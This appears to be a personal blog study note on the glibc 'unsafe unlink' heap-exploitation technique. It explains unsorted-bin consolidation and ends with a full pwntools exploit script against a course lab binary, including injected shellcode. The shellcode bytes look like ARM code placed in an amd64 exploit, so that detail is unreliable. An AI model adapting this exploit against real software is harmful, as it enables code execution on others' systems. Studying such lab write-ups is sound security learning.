
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Unsorted Bin The unsorted bin is a unique bin present into each arena which consists into a double-linked circular list i.e. each free chunk in the bin has a fw_pointer and a bk_pointer respectively to the next and previous chunk. The unsorted bin, being only one, holds chunks of …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - Unsafe Unlink"/>
  <meta property="og:description" content="Unsorted Bin The unsorted bin is a unique bin present into each arena which consists into a double-linked circular list i.e. each free chunk in the bin has a fw_pointer and a bk_pointer respectively to the next and previous chunk. The unsorted bin, being only one, holds chunks of …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/binary-exploitation/heap-journey/unsafe-unlink.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-09-23 18:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - Unsafe Unlink</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/unsafe-unlink">Heap Journey - Unsafe Unlink</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#unsorted-bin" title="Unsorted Bin">Unsorted Bin</a></li><li><a class="toc-href" href="#unsafe-unlink-technique" title="Unsafe Unlink Technique">Unsafe Unlink Technique</a></li></ul></div>
        </div>
    <h2 id="unsorted-bin">Unsorted Bin</h2>
<p>The unsorted bin is a unique bin present into each arena which consists into a double-linked circular list i.e. each free chunk in the bin has a fw_pointer and a bk_pointer respectively to the next and previous chunk. The unsorted bin, being only one, holds chunks of any size of those not being valid for fastbins (or tcache).</p>
<p>Unlike fastbins, where chunks are allocated from the head, from unsorted bins, they're allocated from the tail.</p>
<ul>
<li><strong>Chunk consolidation</strong>: chunks that are too large for fastbins (and tcache), said <em>normal</em>, and adjacent to the top chunk are 'consolidated' into the top chunk, i.e. merged to the top chunk, when freed. The same happens for two or more adjacent <em>normal</em> chunks, which get merged into a new single chunk which size is the sum of the merged ones.</li>
</ul>
<p>The behavior of the memory allocator relative to the unsorted bin is described by the following scenario: a chunk <strong>A</strong> and a chunk <strong>B</strong> of size 0x90 are allocated into the heap. 
- The chunk <strong>B</strong> is freed; the freed chunk is <strong><em>consolidated</em></strong> into the top chunk (it 'disappears' from the heap) since it's adjacent to it. </p>
<p><img alt='"Chunk consolidation into top chunk"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsorted-bin-1.png" title="Chunk consolidation into top chunk"/></p>
<p>Next, a new chunk <strong>C</strong> of size 0x90 is allocated followed by a 0x20 <strong>D</strong> chunk. </p>
<ul>
<li>The <strong>A</strong> chunk is freed and no consolidation happens; instead, the <em>bk_pointer</em> and <em>fw_pointer</em> of the <strong>A</strong> freed chunk are updated together with the <strong>PREV_INUSE</strong> bit in the <strong>C</strong> <strong>CHUNK_SIZE</strong> header field (set to 0x90 instead 0x91) and the <strong>C</strong> <strong>PREV_CHUNK_SIZE</strong> header field (set as well to 0x90).</li>
</ul>
<p><img alt='"C Chunk PREV_CHUNK_SIZE and PREV_INUSE"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsorted-bin-2.png" title="C Chunk PREV_CHUNK_SIZE and PREV_INUSE"/>
<img alt='"Chunk moved into the unsorted bin"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsorted-bin-3.png" title="Chunk moved into the unsorted bin"/></p>
<p>Then, the <strong>C</strong> chunk is freed.</p>
<ul>
<li>The <strong>A</strong> chunk gets consolidated into the <strong>C</strong> chunk and a new free chunk which size corresponds to the sum of the two free chunk size is created. </li>
<li>At the same time, the <strong>D</strong> chunk <strong>PREV_INUSE</strong> bit and <strong>PREV_CHUNK_SIZE</strong> are updated respectively to 0x20 (instead of 0x21) and 0x120 (0x90 + 0x90). </li>
<li>The unsorted bin still points to the A chunk address, but now it has changed to a new chunk*.</li>
</ul>
<p><img alt='"Chunk consolidation"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsorted-bin-4.png" title="Chunk consolidation"/></p>
<p>In this scenario, the unsorted bin has only one element so it appears that nothing relevant happened. Actually, if the <strong>C</strong> chunks was in the unsorted bin, it would have been removed; the ptmalloc implementation checks if there are valid candidates for consolidation by checking the <em>PREV_INUSE</em> bit, then looks backward using the <em>PREV_CHUNK_SIZE</em> and forward using the <em>CHUNK_SIZE</em>. </p>
<ul>
<li>When a consolidation takes place, it has to search and remove, i.e, <strong>unlink</strong> the chunks involved in the consolidation process from the unsorted bin (actually, from every free chunks list).</li>
</ul>
<p>Being the unsorted bin a double-linked circular list, the <strong>unlinking</strong> process of an Item(i) consists into setting the Item(i-1) <strong>fw_pointer</strong> to that of the Item(i) as well as the Item(i+1) <strong>bk_pointer</strong> to that of the Item(i). </p>
<ul>
<li>P-&gt;fd-&gt;bk = P-&gt;bk</li>
<li>P-&gt;bk-&gt;fd = P-&gt;fd</li>
</ul>
<p>Here follows an example of unlinking for a three-item double-linked list.</p>
<p><img alt='"Unlinking in double-linked lists of three elements"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsorted-bin-5.png" title="Unlinking"/></p>
<h2 id="unsafe-unlink-technique">Unsafe Unlink Technique</h2>
<p>Originally used in 2000's to pwn the Netscape browser (nowadays isn't generally exploitable for recent GLIBC versions and CPU implementations, but it's still useful to know it), this technique takes advantage of the unlinking and consolidation processes. When the attacker has the ability to modify the PREV_INUSE bit of a chunk, it can trick the allocator to perform a malicious consolidation which can result into a command execution or a arbitrary read/write.</p>
<p>When forcingly unsetting the PREV_INUSE bit for a <strong>B</strong> chunk, the ptmalloc will consider its previous chunk <strong>A</strong> as free, even though it is not. If a free() is requested for the <strong>B</strong> chunk, the mallocator will check if its PREV_INUSE is set; if not, it will trigger a consolidation for <strong>A</strong>.</p>
<ul>
<li>By forging the <strong>A</strong> chunk as a fake freed chunk, with arbitraries fw_pointer and bk_pointer, it's possibile to abuse the forced consolidation to perform a <strong>reflected write/read</strong>: the fw_pointer will corresponds to the target memory area (where to write) and the bk_pointer will be the address to be written into the target. This is possibile due the unlinking mechanism where fw_pointer and bk_pointer are updated for next and previous items of the one to be removed.</li>
</ul>
<p>Targeting, for example, the __free_hook, a malicious <strong>A</strong> chunk would have:</p>
<ul>
<li>fw_pointer = &amp;__free_hook - 0x18</li>
<li>bk_pointer = address of shellcode/gadget</li>
</ul>
<p>Some points are to be made out:</p>
<ul>
<li>A 0x18 is subtracted from the &amp;__free_hook since, thinking of it as a real chunk, its bk_pointer position would be at <em>header_size</em> + <em>fw_pointer size</em> = 0x10 + 0x8 offset; this allows to write the shellcode/gadget address to the correct position.</li>
<li>It's not possible to use directly libc system() address as bk_pointer since, due to consolidation, the ptmalloc will try to update an hypotetical fw_pointer (&amp;system() + 0x10) attempting to write into a read-only memory area. <strong>When performing the reflected write, both the addressess pointed must belong to a writable memory area</strong></li>
<li>When NX is disabled (in 2000's didn't even exist), it's possible run shellcode written in any memory area, so, in this case, the attacker could load the shellcode into the heap itself.</li>
<li>This technique is the "backwad" variation of this attack since it uses the consolidation of a (fake) free chunk located <strong>before</strong> the freed chunk. The "forward" variation abuses a (fake) free chunk following the one to be freed.</li>
</ul>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary <em>unsafe_unlik</em> is vulnerable to this heap exploitation technique.</p>
<p>The checksec tool is executed:</p>
<blockquote>
<p>&gt; checksec unsafe_unlink<br/>
&nbsp;&nbsp;Arch:     amd64-64-little<br/>
&nbsp;&nbsp;RELRO:    Full RELRO<br/>
&nbsp;&nbsp;Stack:    Canary found<br/>
&nbsp;&nbsp;<strong>NX:       NX disabled</strong><br/>
&nbsp;&nbsp;PIE:      PIE enabled<br/>
&nbsp;&nbsp;RWX:      Has RWX segments<br/>
&nbsp;&nbsp;RUNPATH:  b'../.glibc/glibc_2.23_unsafe-unlink'  </p>
</blockquote>
<p>Running the binary:</p>
<blockquote>
<p>===============  |   HeapLAB   |  Unsafe Unlink ===============<br/>
<br/><br/>
puts() @ 0x7f504f4675a0<br/>
heap @ 0x561ab1955000<br/>
<br/> <br/>
1) malloc 0/2<br/>
2) edit<br/>
3) free<br/>
4) quit<br/>
&gt;   </p>
</blockquote>
<p>Two chunks of size 0x88, greater than fastbin/tcache typical sizes, are allocated:</p>
<blockquote>
<p>&gt; 1<br/>
size: 0x88<br/>
...<br/>
&gt; 1<br/>
size: 0x88</p>
</blockquote>
<p>Then, the first chunk content is set as A * 136 (size of chunk) + 4:</p>
<blockquote>
<p>&gt; 2<br/>
index: 0<br/>
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  </p>
</blockquote>
<p>Analyzing the heap, it emerges that no boundary checks are in place and the first chunk data overflows into the second chunk header:</p>
<p><img alt='"Heap overflow"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsafe-unlink-1.png" title="Heap overflow"/></p>
<p>It's possible to weaponize this overflow by performing the <strong>unsafe unlink</strong> attack. Moreover libc and heap address are leaked; this allows to target the __free_hook to perform a command execution by loading shellcode directly into the heap (since we're faking to be in 2000s when there wasn't the NX in place).</p>
<p>The first step is to forge the first chunk as a fake freed chunk which <strong>fw_pointer</strong> points to the __free_hook and the bk_pointer points to the shellcode stored into chunk itself.</p>
<p><code>header_size = 0x10</code></p>
<p><code>pointer_size = 0x8</code></p>
<p><code>fw_pointer = libc.sym.__free_hook - (header_size + pointer_size)</code></p>
<p><code>bk_pointer = heap_leaked_addr + 0x20</code></p>
<ul>
<li>Note: the 0x20 added to the heap_leaked_addr (heap base address) corresponds to 0x10 from the header size plus 0x10 from the fw_pointer and bk_pointer themselves.</li>
</ul>
<p>The shellcode payload is stored into the chunk itself; due the unlinking process triggered by the forced chunk consolidation, the payload would be corrupted in his 3rd quadword, i.e., malloc will write the __free_hook address where the fw_pointer is supposed to be. A nop sled padding is used to bypass this problem.</p>
<p>Moreover, to perform the overflow, some junk data is addedd to the fake pointers and shellcode.</p>
<p><code>padding = b"\x90" * (header_size + (pointer_size * 2))</code></p>
<p><code>shellcode = padding + b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x40\x40\x78\x44\x0c\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x01\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x2f\x73\x68"</code></p>
<p><code>chunk_A_data = p64(fw_pointer) + p64(bk_pointer) + shellcode</code></p>
<p><code>chunk_A_junk = b"\x00" * (0x88 - len(chunk_A_data) - 0x8)</code></p>
<p>The overflow bug is used to override the PREV_CHUNK_SIZE and the PREV_INUSE bit; this is done when setting the chunk data:</p>
<p><code>fake_prev_size_field = fake_prev_inuse_bit = p64(0x90)</code></p>
<p><code>edit(b"0", chunk_A_data + chunk_A_junk + fake_prev_size_field + fake_prev_inuse_bit)</code></p>
<p>Analyzing the heap:</p>
<p><img alt='"Heap overflow weaponization"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsafe-unlink-2.png" title="Heap overflow weaponization"/></p>
<ul>
<li>The second chunks has now the PREV_INUSE bit unset and the PREV_CHUNK_SIZE set to 0x90; the malloc implementation is tricked to believe that the first chunk is freed.</li>
</ul>
<p>A free() for the second chunk will start the consolidation process which will trigger the unlinking process. As result, the __free_hook will point to the shellcode into the stack.</p>
<p><img alt='"Unsafe unlinking"' src="/images/binary-exploitation/heap-journey/unsafe-unlink/unsafe-unlink-3.png" title="Unsafe unlinking"/></p>
<ul>
<li>Note the circular reference</li>
</ul>
<p>When a new free() is requested, the __free_hook will be triggered and then the shellcode would be executed since there no NX protection.</p>
<p>Sadly, the 2000's are gone and, even though the NX is diabled, the heap memory map has no execution permissions so the shellcode won't work (SEGFAULT).</p>
<blockquote>
<p>&gt; gef info proc map<br/>
...<br/>
<strong>0x555555603000&nbsp;&nbsp;&nbsp;&nbsp;0x555555624000</strong>&nbsp;&nbsp;&nbsp;&nbsp;0x21000&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;&nbsp;&nbsp;&nbsp;<strong>rw-p</strong>&nbsp;&nbsp;&nbsp;&nbsp;[heap]</p>
</blockquote>
<p>Following the complete pwntools solution: </p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./unsafe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.23_unsafe-unlink/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./unsafe_unlink"</span><span class="p">)</span>
<span class="c1">#p = process("./unsafe_unlink")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"heap @ "</span><span class="p">)</span>
<span class="n">heap_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index: "</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>


<span class="nb">print</span><span class="p">(</span><span class="s2">"Forge fake freed chunk"</span><span class="p">)</span>
<span class="n">header_size</span> <span class="o">=</span> <span class="mh">0x10</span>
<span class="n">pointer_size</span> <span class="o">=</span> <span class="mh">0x8</span>

<span class="n">fw_pointer</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="p">(</span><span class="n">header_size</span> <span class="o">+</span> <span class="n">pointer_size</span><span class="p">)</span>
<span class="n">bk_pointer</span> <span class="o">=</span> <span class="n">heap_leaked_addr</span> <span class="o">+</span> <span class="mh">0x20</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Forward Pointer : 0x</span><span class="si">{</span><span class="n">fw_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Backward Pointer : 0x</span><span class="si">{</span><span class="n">bk_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">header_size</span> <span class="o">+</span> <span class="p">(</span><span class="n">pointer_size</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x40\x40\x78\x44\x0c\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x01\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s2">"</span>


<span class="n">chunk_A_data</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fw_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="n">chunk_A_junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x88</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_A_data</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> 

<span class="n">fake_prev_size_field</span> <span class="o">=</span> <span class="n">fake_prev_inuse_bit</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Overlow to chunk B header"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="n">chunk_A_data</span> <span class="o">+</span> <span class="n">chunk_A_junk</span> <span class="o">+</span> <span class="n">fake_prev_size_field</span> <span class="o">+</span> <span class="n">fake_prev_inuse_bit</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Force chunk A consolidation by freeing B"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Trigger free hook by freeing the chunk A"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2026 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>